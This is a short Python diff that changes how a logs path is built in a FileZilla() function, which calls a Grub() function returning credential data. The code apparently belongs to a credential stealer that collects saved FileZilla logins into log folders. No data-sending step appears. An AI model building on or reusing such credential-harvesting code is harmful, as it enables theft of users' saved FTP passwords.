@@ -64,8 +64,7 @@ def Grub():
             return credentialsData
 
 def FileZilla():
-    user = os.environ['USERPROFILE']
-    path = f'{user}\\{config.pathToLogs}\\FileZilla'
+    path = os.path.join(config.pathToLogs, "FileZilla")
     try:
         os.makedirs(path, exist_ok=True)
         data = Grub()
